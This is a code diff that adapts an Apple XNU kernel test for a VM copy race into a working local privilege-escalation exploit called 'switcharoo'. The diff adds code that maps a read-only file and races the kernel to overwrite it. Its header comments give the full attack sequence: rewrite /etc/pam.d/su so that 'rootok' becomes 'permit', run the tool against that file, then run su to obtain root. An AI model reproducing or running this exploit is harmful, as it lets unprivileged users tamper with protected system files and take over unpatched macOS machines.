@@ -1,6 +1,11 @@
 // from https://github.com/apple-oss-distributions/xnu/blob/xnu-8792.61.2/tests/vm/vm_unaligned_copy_switch_race.c
 // modified to compile outside of XNU
 
+// clang -o switcharoo vm_unaligned_copy_switch_race.c
+// sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
+// ./switcharoo /etc/pam.d/su overwrite_file.bin
+// su
+
 #include <pthread.h>
 #include <dispatch/dispatch.h>
 #include <stdio.h>
@@ -9,6 +14,9 @@
 #include <mach/mach_port.h>
 #include <mach/vm_map.h>
 
+#include <fcntl.h>
+#include <sys/mman.h>
+
 #define T_QUIET
 #define T_EXPECT_MACH_SUCCESS(a, b)
 #define T_EXPECT_MACH_ERROR(a, b, c)
@@ -16,11 +24,14 @@
 #define T_ASSERT_MACH_ERROR(a, b, c)
 #define T_ASSERT_POSIX_SUCCESS(a, b)
 #define T_ASSERT_EQ(a, b, c) do{if ((a) != (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
-#define T_ASSERT_NE(a, b, c)
+#define T_ASSERT_NE(a, b, c) do{if ((a) == (b)) { fprintf(stderr, c "\n"); exit(1); }}while(0)
 #define T_ASSERT_TRUE(a, b, ...)
 #define T_LOG(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
 #define T_DECL(a, b) static void a(void)
 #define T_PASS(a, ...) fprintf(stderr, a "\n", __VA_ARGS__)
+
+static const char* g_arg_target_file_path;
+static const char* g_arg_overwrite_file_path;
 
 struct context1 {
 	vm_size_t obj_size;
@@ -105,7 +116,7 @@ T_DECL(unaligned_copy_switch_race,
 	ctx->done = false;
 	ctx->mem_entry_rw = MACH_PORT_NULL;
 	ctx->mem_entry_ro = MACH_PORT_NULL;
-
+#if 0
 	/* allocate our attack target memory */
 	kr = vm_allocate(mach_task_self(),
 	    &ro_addr,
@@ -114,6 +125,9 @@ T_DECL(unaligned_copy_switch_race,
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate ro_addr");
 	/* initialize to 'A' */
 	memset((char *)ro_addr, 'A', ctx->obj_size);
+#endif
+	int fd = open(g_arg_target_file_path, O_RDONLY | O_CLOEXEC);
+	ro_addr = (uintptr_t)mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, fd, 0);
 	/* make it read-only */
 	kr = vm_protect(mach_task_self(),
 	    ro_addr,
@@ -176,6 +190,31 @@ T_DECL(unaligned_copy_switch_race,
 	T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_allocate e5");
 	/* initialize to 'C' */
 	memset((char *)e5, 'C', ctx->obj_size);
+
+	FILE* overwrite_file = fopen(g_arg_overwrite_file_path, "r");
+	fseek(overwrite_file, 0, SEEK_END);
+	size_t overwrite_length = ftell(overwrite_file);
+	if (overwrite_length >= PAGE_SIZE) {
+		fprintf(stderr, "too long!\n");
+		exit(1);
+	}
+	fseek(overwrite_file, 0, SEEK_SET);
+	char* e5_overwrite_ptr = (char*)(e5 + ctx->obj_size - overwrite_length);
+	fread(e5_overwrite_ptr, 1, overwrite_length, overwrite_file);
+	fclose(overwrite_file);
+
+	int overwrite_first_diff_offset = -1;
+	char overwrite_first_diff_value = 0;
+	for (int off = 0; off < overwrite_length; off++) {
+		if (((char*)ro_addr)[off] != e5_overwrite_ptr[off]) {
+			overwrite_first_diff_offset = off;
+			overwrite_first_diff_value = ((char*)ro_addr)[off];
+		}
+	}
+	if (overwrite_first_diff_offset == -1) {
+		fprintf(stderr, "no diff?\n");
+		exit(1);
+	}
 
 	/*
 	 * get a handle on some writable memory that will be temporarily
@@ -259,7 +298,7 @@ T_DECL(unaligned_copy_switch_race,
 		kr = vm_read_overwrite(mach_task_self(),
 		    e5,
 		    ctx->obj_size,
-		    e2 + 1,
+		    e2 + overwrite_length,
 		    &copied_size);
 		T_QUIET;
 		T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
@@ -279,7 +318,7 @@ T_DECL(unaligned_copy_switch_race,
 			break;
 		}
 		/* check that our read-only memory was not modified */
-		T_QUIET; T_ASSERT_EQ(*(char *)ro_addr, 'A', "RO mapping was modified");
+		T_QUIET; T_ASSERT_EQ(((char *)ro_addr)[overwrite_first_diff_offset], overwrite_first_diff_value, "RO mapping was modified");
 
 		/* tell racing thread to stop toggling mappings */
 		pthread_mutex_lock(&ctx->mtx);
@@ -309,6 +348,12 @@ T_DECL(unaligned_copy_switch_race,
 	T_PASS("Ran %d times in %ld seconds with no failure", loops, duration);
 }
 
-int main() {
+int main(int argc, char** argv) {
+	if (argc != 3) {
+		fprintf(stderr, "usage: switcharoo target_file overwrite_file\n");
+		return 0;
+	}
+	g_arg_target_file_path = argv[1];
+	g_arg_overwrite_file_path = argv[2];
 	unaligned_copy_switch_race();
 }
